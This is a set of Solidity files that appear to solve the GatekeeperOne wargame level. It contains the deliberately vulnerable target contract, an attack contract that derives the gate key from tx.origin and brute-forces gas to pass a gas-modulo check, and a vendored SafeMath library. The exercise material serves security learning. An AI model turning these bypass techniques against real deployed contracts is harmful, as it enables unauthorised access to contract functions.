// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.15;

import { GatekeeperOne } from "src/GatekeeperOne/GatekeeperOne.sol";
import { toBytes } from "src/utils/toBytes.sol";

contract GatekeeperOneAttack {
    // address public gatekeeperOneInstance = address(0x536734cD63fb1E3b318eC09d7e0709737da436C0);

    event GasPassed(uint indexed gasUsed);
    event GasFailed(uint indexed gasUsed);
    event Hacked(bool indexed success);

    function attack(address targetAddress, uint magicGasAmount) external returns (bool success) {
        /* Calculating the gate key. Here are the requirements for Gate 3:::

            require(uint32(uint64(_gateKey)) == uint16(uint64(_gateKey)), "GatekeeperOne: invalid gateThree part one");
            require(uint32(uint64(_gateKey)) != uint64(_gateKey), "GatekeeperOne: invalid gateThree part two");
            require(uint32(uint64(_gateKey)) == uint16(tx.origin), "GatekeeperOne: invalid gateThree part three");

        /* to pass GateThree Part 3:
            uint16(uint160(tx.origin)) == 0x1234
            uint32(uint64(key))        == 0x00001234
            SO.... gate key definitely ends with the 2 tx.origin bytes, AND
            definitely has 4 zeros (2 empty bytes) preceding it.
            PART 1 and PART 3 are essentially the same check. 
            Both need two bytes empty and two bytes that match the end of the tx.origin address
            To complete PART 2, the first 4 bytes in the gateKey out of the 8 bytes need to have some kind of data
            other than 0, so we can just AND the first four bytes of the uint64 with the tx.origin address.
            
            Putting it all together:
            1) convert msg.sender (which is the tx.origin when calling from a contract) to 64 bytes:
                uint64(uint(160(msg.sender)))
            2) include the first 4 bytes of the address to pass PART 2, i.e.
                bytes8(uint64(uint160(msg.sender)) & 0xFFFFFFFF00000000)
            3) include the last two bytes of the tx.origin address to pass PART 1 and PART 3, i.e.
                bytes8(uint64(uint160(msg.sender)) & 0xFFFFFFFF0000FFFF)
        */
        bytes8 gateKey = bytes8(uint64(uint160(tx.origin)) & uint64(0xFFFFFFFF0000FFFF));
        // Found gas amount via GatekeeperOneAttackFork.testForkRealGasAttack():
        // emit GasPassed(gasUsed: 24827)
        success = GatekeeperOne(targetAddress).enter{gas: magicGasAmount}(gateKey);

        emit Hacked(success);

        // named return value or not, I think it makes sense to explicitly return values 🤷‍♂️
        return success;
    }

    function gasAttack(address targetAddress) external returns (bool success, uint gasAmount) {
        uint muhgas; // brute force to find gas amount as we reach Gate 2
        uint gasBase = 8191 * 3; // gas needs to be a multiple of 8191. 3 is the lowest that will complete the tx
        bytes8 gateKey = bytes8(uint64(uint160(tx.origin)) & 0xFFFFFFFF0000FFFF);

        for (muhgas = 0; muhgas <= 8191; muhgas++) {
            try GatekeeperOne(targetAddress).enter{gas: (muhgas + gasBase)}(gateKey) {
                emit GasPassed(gasBase + muhgas);
                success = true;
                break;
            } catch {
                emit GasFailed(gasBase + muhgas);
            }
        }

        return (success, gasBase + muhgas);
    }
}

// SPDX-License-Identifier: MIT
pragma solidity ^0.8.15;

import "@openzeppelin/utils/math/SafeMath.sol";

contract GatekeeperOne {
    using SafeMath for uint256;
    address public entrant;

    modifier gateOne() {
        require(msg.sender != tx.origin, "FAILED GATE ONE");
        _;
    }

    modifier gateTwo() {
        require(gasleft().mod(8191) == 0, "FAILED GATE TWO");
        _;
    }

    modifier gateThree(bytes8 _gateKey) {
        require(uint32(uint64(_gateKey)) == uint16(uint64(_gateKey)), "GatekeeperOne: invalid gateThree part one");
        require(uint32(uint64(_gateKey)) != uint64(_gateKey), "GatekeeperOne: invalid gateThree part two");
        require(uint32(uint64(_gateKey)) == uint16(uint160(tx.origin)), "GatekeeperOne: invalid gateThree part three");
        _;
    }

    function enter(bytes8 _gateKey) public gateOne gateTwo gateThree(_gateKey) returns (bool) {
        entrant = tx.origin;
        return true;
    }
}

// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.15;
    
// helper function to convert an uint to bytes
function toBytes(uint256 x) pure returns (bytes memory b) {
    b = new bytes(32);
    assembly {
        mstore(add(b, 32), x)
    }
}

// SPDX-License-Identifier: MIT
// OpenZeppelin Contracts (last updated v4.6.0) (utils/math/SafeMath.sol)

pragma solidity ^0.8.0;

// CAUTION
// This version of SafeMath should only be used with Solidity 0.8 or later,
// because it relies on the compiler's built in overflow checks.

/**
 * @dev Wrappers over Solidity's arithmetic operations.
 *
 * NOTE: `SafeMath` is generally not needed starting with Solidity 0.8, since the compiler
 * now has built in overflow checking.
 */
library SafeMath {
    /**
     * @dev Returns the addition of two unsigned integers, with an overflow flag.
     *
     * _Available since v3.4._
     */
    function tryAdd(uint256 a, uint256 b) internal pure returns (bool, uint256) {
        unchecked {
            uint256 c = a + b;
            if (c < a) return (false, 0);
            return (true, c);
        }
    }

    /**
     * @dev Returns the subtraction of two unsigned integers, with an overflow flag.
     *
     * _Available since v3.4._
     */
    function trySub(uint256 a, uint256 b) internal pure returns (bool, uint256) {
        unchecked {
            if (b > a) return (false, 0);
            return (true, a - b);
        }
    }

    /**
     * @dev Returns the multiplication of two unsigned integers, with an overflow flag.
     *
     * _Available since v3.4._
     */
    function tryMul(uint256 a, uint256 b) internal pure returns (bool, uint256) {
        unchecked {
            // Gas optimization: this is cheaper than requiring 'a' not being zero, but the
            // benefit is lost if 'b' is also tested.
            // See: https://github.com/OpenZeppelin/openzeppelin-contracts/pull/522
            if (a == 0) return (true, 0);
            uint256 c = a * b;
            if (c / a != b) return (false, 0);
            return (true, c);
        }
    }

    /**
     * @dev Returns the division of two unsigned integers, with a division by zero flag.
     *
     * _Available since v3.4._
     */
    function tryDiv(uint256 a, uint256 b) internal pure returns (bool, uint256) {
        unchecked {
            if (b == 0) return (false, 0);
            return (true, a / b);
        }
    }

    /**
     * @dev Returns the remainder of dividing two unsigned integers, with a division by zero flag.
     *
     * _Available since v3.4._
     */
    function tryMod(uint256 a, uint256 b) internal pure returns (bool, uint256) {
        unchecked {
            if (b == 0) return (false, 0);
            return (true, a % b);
        }
    }

    /**
     * @dev Returns the addition of two unsigned integers, reverting on
     * overflow.
     *
     * Counterpart to Solidity's `+` operator.
     *
     * Requirements:
     *
     * - Addition cannot overflow.
     */
    function add(uint256 a, uint256 b) internal pure returns (uint256) {
        return a + b;
    }

    /**
     * @dev Returns the subtraction of two unsigned integers, reverting on
     * overflow (when the result is negative).
     *
     * Counterpart to Solidity's `-` operator.
     *
     * Requirements:
     *
     * - Subtraction cannot overflow.
     */
    function sub(uint256 a, uint256 b) internal pure returns (uint256) {
        return a - b;
    }

    /**
     * @dev Returns the multiplication of two unsigned integers, reverting on
     * overflow.
     *
     * Counterpart to Solidity's `*` operator.
     *
     * Requirements:
     *
     * - Multiplication cannot overflow.
     */
    function mul(uint256 a, uint256 b) internal pure returns (uint256) {
        return a * b;
    }

    /**
     * @dev Returns the integer division of two unsigned integers, reverting on
     * division by zero. The result is rounded towards zero.
     *
     * Counterpart to Solidity's `/` operator.
     *
     * Requirements:
     *
     * - The divisor cannot be zero.
     */
    function div(uint256 a, uint256 b) internal pure returns (uint256) {
        return a / b;
    }

    /**
     * @dev Returns the remainder of dividing two unsigned integers. (unsigned integer modulo),
     * reverting when dividing by zero.
     *
     * Counterpart to Solidity's `%` operator. This function uses a `revert`
     * opcode (which leaves remaining gas untouched) while Solidity uses an
     * invalid opcode to revert (consuming all remaining gas).
     *
     * Requirements:
     *
     * - The divisor cannot be zero.
     */
    function mod(uint256 a, uint256 b) internal pure returns (uint256) {
        return a % b;
    }

    /**
     * @dev Returns the subtraction of two unsigned integers, reverting with custom message on
     * overflow (when the result is negative).
     *
     * CAUTION: This function is deprecated because it requires allocating memory for the error
     * message unnecessarily. For custom revert reasons use {trySub}.
     *
     * Counterpart to Solidity's `-` operator.
     *
     * Requirements:
     *
     * - Subtraction cannot overflow.
     */
    function sub(
        uint256 a,
        uint256 b,
        string memory errorMessage
    ) internal pure returns (uint256) {
        unchecked {
            require(b <= a, errorMessage);
            return a - b;
        }
    }

    /**
     * @dev Returns the integer division of two unsigned integers, reverting with custom message on
     * division by zero. The result is rounded towards zero.
     *
     * Counterpart to Solidity's `/` operator. Note: this function uses a
     * `revert` opcode (which leaves remaining gas untouched) while Solidity
     * uses an invalid opcode to revert (consuming all remaining gas).
     *
     * Requirements:
     *
     * - The divisor cannot be zero.
     */
    function div(
        uint256 a,
        uint256 b,
        string memory errorMessage
    ) internal pure returns (uint256) {
        unchecked {
            require(b > 0, errorMessage);
            return a / b;
        }
    }

    /**
     * @dev Returns the remainder of dividing two unsigned integers. (unsigned integer modulo),
     * reverting with custom message when dividing by zero.
     *
     * CAUTION: This function is deprecated because it requires allocating memory for the error
     * message unnecessarily. For custom revert reasons use {tryMod}.
     *
     * Counterpart to Solidity's `%` operator. This function uses a `revert`
     * opcode (which leaves remaining gas untouched) while Solidity uses an
     * invalid opcode to revert (consuming all remaining gas).
     *
     * Requirements:
     *
     * - The divisor cannot be zero.
     */
    function mod(
        uint256 a,
        uint256 b,
        string memory errorMessage
    ) internal pure returns (uint256) {
        unchecked {
            require(b > 0, errorMessage);
            return a % b;
        }
    }
}